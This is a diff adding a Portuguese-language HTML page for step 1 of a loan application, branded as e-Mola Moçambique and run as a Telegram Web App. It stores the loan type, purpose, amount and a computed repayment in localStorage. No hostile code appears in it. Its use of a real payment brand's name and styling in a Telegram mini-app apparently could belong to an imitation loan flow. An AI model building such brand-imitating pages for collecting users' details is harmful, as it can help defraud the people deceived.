@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="pt-MZ">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Pedido de Empréstimo - Passo 1</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body { font-family: -apple-system, sans-serif; background-color: #f8f9fa; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        /* e-mola Orange Gradient */
+        .nav-header { width: 100%; background: linear-gradient(90deg, #FF6600 0%, #FF8500 100%); padding: 15px 20px; color: white; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
+        .emola-logo { font-size: 24px; font-weight: bold; }
+        .form-card { background: white; width: 92%; max-width: 480px; margin-top: 25px; padding: 30px 20px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); box-sizing: border-box; }
+        h2 { text-align: center; margin: 0; font-size: 26px; color: #333; font-weight: 600; }
+        .step-info { text-align: center; font-size: 15px; color: #888; margin: 10px 0 25px; }
+        .progress-box { display: flex; gap: 8px; margin-bottom: 35px; }
+        .bar { height: 4px; flex: 1; background: #e0e0e0; border-radius: 2px; }
+        /* e-mola Orange Active Bar */
+        .active-bar { background: #FF6600; }
+        .input-wrap { margin-bottom: 22px; }
+        label { display: block; font-size: 16px; font-weight: 500; margin-bottom: 10px; color: #333; }
+        select, input, textarea { width: 100%; padding: 15px; border: 1px solid #d1d1d1; border-radius: 8px; font-size: 17px; box-sizing: border-box; background: #fff; }
+        .btn-container { margin-top: 30px; display: flex; flex-direction: column; gap: 15px; }
+        .back-btn { background-color: #f1f1f1; color: #777; border: 1px solid #ddd; padding: 16px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        /* e-mola Orange Next Button */
+        .next-btn { background: linear-gradient(90deg, #FF6600 0%, #FF8500 100%); color: white; border: none; padding: 18px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .footer-text { text-align: center; font-size: 13px; color: #aaa; margin-top: 40px; padding-bottom: 30px; }
+    </style>
+</head>
+
+<body>
+
+<div class="nav-header">
+    <!-- Portuguese back text -->
+    <div onclick="goBack()" style="cursor:pointer; font-size:20px;">← Voltar</div>
+    <div class="emola-logo">e-Mola</div>
+    <div style="font-size: 26px;">☰</div>
+</div>
+
+<div class="form-card">
+    <!-- Portuguese title and step info -->
+    <h2>Pedido de Empréstimo</h2>
+    <p class="step-info">Passo 1 de 3</p>
+
+    <div class="progress-box">
+        <div class="bar active-bar"></div>
+        <div class="bar"></div>
+        <div class="bar"></div>
+    </div>
+
+    <div class="input-wrap">
+        <!-- Portuguese labels and options -->
+        <label>Tipo de Empréstimo</label>
+        <select id="loanType">
+            <option value="Empréstimo Pessoal" selected>Empréstimo Pessoal</option>
+            <option value="Empréstimo Comercial">Empréstimo Comercial</option>
+            <option value="Empréstimo para Veículo">Empréstimo para Veículo</option>
+            <option value="Empréstimo para Habitação">Empréstimo para Habitação</option>
+            <option value="Empréstimo para Educação">Empréstimo para Educação</option>
+        </select>
+    </div>
+
+    <div class="input-wrap">
+        <!-- Changed currency label to MT -->
+        <label>Valor do Empréstimo (MT)</label>
+        <input type="number" id="loanAmount" readonly style="background:#f9f9f9">
+    </div>
+
+    <div class="input-wrap">
+        <label>Duração do Empréstimo</label>
+        <input type="text" id="loanDuration" readonly style="background:#f9f9f9">
+    </div>
+
+    <div class="input-wrap">
+        <label>Objetivo do Empréstimo</label>
+        <textarea id="loanPurpose" rows="3" placeholder="Para que vai usar?"></textarea>
+    </div>
+
+    <div class="btn-container">
+        <!-- Portuguese button text -->
+        <button class="back-btn" onclick="goBack()">ANTERIOR</button>
+        <button class="next-btn" onclick="goNext()">PRÓXIMO PASSO</button>
+    </div>
+</div>
+
+<!-- Portuguese footer -->
+<div class="footer-text">© 2026 e-Mola Moçambique</div>
+
+<script>
+    function goNext() {
+        const purposeEl = document.getElementById('loanPurpose');
+        const typeEl = document.getElementById('loanType');
+        const amountVal = document.getElementById('loanAmount').value;
+        const durationVal = document.getElementById('loanDuration').value;
+
+        if (!purposeEl || !typeEl) return;
+
+        const purpose = purposeEl.value.trim();
+        const type = typeEl.value;
+
+        if (!purpose) {
+            // Portuguese alert
+            alert("Por favor, preencha o objetivo do empréstimo.");
+            return;
+        }
+
+        // --- Standard Save (Your current flow) ---
+        localStorage.setItem('loanPurpose', purpose);
+        localStorage.setItem('loanType', type);
+
+        // --- NEW: Success Page Save (Carrying data forward) ---
+        // Clean the duration string (e.g., "12 Meses" becomes "12")
+        const cleanDuration = durationVal.replace(/\D/g, ''); 
+        
+        // Calculate monthly (Amount * 1.18 interest / duration)
+        const monthly = ((Number(amountVal) * 1.18) / Number(cleanDuration)).toFixed(2);
+
+        localStorage.setItem('loan_amount', amountVal);
+        localStorage.setItem('loan_term', cleanDuration);
+        localStorage.setItem('monthly_repayment', monthly);
+
+        // Update to your actual next page filename
+        window.location.href = "page3.html"; 
+    }
+
+    function goBack() {
+        window.location.href = "index.html";
+    }
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        const amountEl = document.getElementById('loanAmount');
+        const durationEl = document.getElementById('loanDuration');
+
+        if (amountEl && durationEl) {
+            // Load values, defaulting to MT context if not set
+            amountEl.value = String(localStorage.getItem('amount') || "1000");
+            durationEl.value = String(localStorage.getItem('loanDuration') || "12 Meses");
+        }
+    };
+</script>
+
+</body>
+</html>
